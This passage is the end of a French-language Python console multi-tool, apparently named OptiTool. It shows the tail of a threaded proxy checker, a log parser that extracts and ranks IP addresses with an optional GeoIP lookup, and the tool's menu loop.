            if done[0] % 10 == 0:
                sys.stdout.write(f"\r{GRAY}  {done[0]}/{len(to_test)} testes, {len(valid)} valides...{RESET}   ")
                sys.stdout.flush()

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        list(ex.map(check, to_test))

    valid.sort(key=lambda x: x["latency"])

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   RESULTATS{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"{GREEN}[+] Valides : {WHITE}{len(valid)}{RESET}")
    print(f"{GREEN}[+] Testes  : {WHITE}{len(to_test)}{RESET}\n")

    if valid:
        print(f"{CYAN}   TOP 10{RESET}")
        for i, v in enumerate(valid[:10], 1):
            print(f"  {GREEN}[{i:>2}]{RESET} {v['proxy']:<45} {CYAN}{v['latency']:>5}ms{RESET} {GRAY}{v['out_ip']}{RESET}")

    out_dir = Path(_safe_workdir()) / "Output" / "ProxyPicker"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / f"valid_{int(time.time())}.txt"
    with open(out_file, "w", encoding="utf-8") as f:
        for v in valid:
            f.write(v["proxy"] + "\n")
    print(f"\n{GREEN}[+] Export : {out_file}{RESET}")

    pause()



def option_60():
    clear()
    banner()

    print(f"\n{CYAN}   [ LOG PARSER — IP EXTRACTOR ]{RESET}\n")
    print(f"{GRAY}  Extrait et classe les IPs d'un fichier log.{RESET}")
    print(f"{GRAY}  Compatible nginx, apache, sshd, auth.log.{RESET}\n")

    src = input(f"{YELLOW}[?]{RESET} Fichier log {RED}->{RESET} ").strip().strip('"').strip("'")
    if not src or not os.path.isfile(src):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    try:
        with open(src, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Parsing de {len(content):,} bytes...{RESET}\n")

    ip_re = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    ipv6_re = re.compile(r"\b(?:[a-fA-F0-9]{1,4}:){2,7}[a-fA-F0-9]{1,4}\b")

    ipv4s = ip_re.findall(content)
    ipv6s = ipv6_re.findall(content)

    from collections import Counter
    counter = Counter(ipv4s + ipv6s)

    total = sum(counter.values())
    uniques = len(counter)

    print(f"{GREEN}[+] Total IP extraites : {WHITE}{total}{RESET}")
    print(f"{GREEN}[+] IPs uniques        : {WHITE}{uniques}{RESET}")
    print(f"{GREEN}[+] IPv4               : {WHITE}{len(ipv4s)}{RESET}")
    print(f"{GREEN}[+] IPv6               : {WHITE}{len(ipv6s)}{RESET}\n")

    print(f"{CYAN}{BOLD}   TOP 20{RESET}\n")
    for ip, count in counter.most_common(20):
        pct = count / total * 100 if total > 0 else 0
        bar_len = int(pct * 0.5)
        bar = "█" * bar_len
        print(f"  {GREEN}{ip:<20}{RESET} {WHITE}{count:>6}{RESET} {CYAN}{pct:>5.1f}%{RESET} {GRAY}{bar}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "LogParser"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"ips_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"IP extract — {src}\n")
            f.write(f"Total : {total} | Uniques : {uniques}\n")
            f.write("=" * 60 + "\n\n")
            for ip, count in counter.most_common():
                f.write(f"{count:>6}  {ip}\n")
        print(f"\n{GREEN}[+] Export : {out_file}{RESET}")
    except Exception:
        pass

    if _need_requests():
        do_geo = input(f"\n{YELLOW}[?]{RESET} GeoIP sur top 10 ? (y/n) {RED}->{RESET} ").strip().lower()
        if do_geo in ("y", "yes", "o", "oui"):
            print()
            for ip, _ in counter.most_common(10):
                if ":" in ip:
                    continue
                try:
                    r = requests.get(
                        f"http://ip-api.com/json/{ip}?fields=country,city,isp,proxy,hosting",
                        timeout=5,
                    )
                    if r.status_code == 200:
                        d = r.json()
                        if d.get("country"):
                            tag = ""
                            if d.get("proxy"): tag += f" {PINK}[PROXY]{RESET}"
                            if d.get("hosting"): tag += f" {PINK}[HOST]{RESET}"
                            print(f"  {GREEN}{ip:<18}{RESET} {WHITE}{d.get('country')}{RESET}, {d.get('city')} {GRAY}({d.get('isp', '?')[:30]}){RESET}{tag}")
                except Exception:
                    pass

    pause()



def main():
    set_title()
    intro()
    loading()
    current_page = 1

    while True:
        if current_page == 1:
            result = page_1()
        elif current_page == 2:
            result = page_2()
        elif current_page == 3:
            result = page_3()

        if result == 0:
            clear()
            print()
            slow_print(f"{RED}[+] Fermeture de OptiTool.py...{RESET}", 0.03)
            time.sleep(0.5)
            break

        if result in (1, 2, 3):
            current_page = result



if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(f"{RED}\n[!] OptiTool ferme par l'utilisateur.{RESET}")
        sys.exit()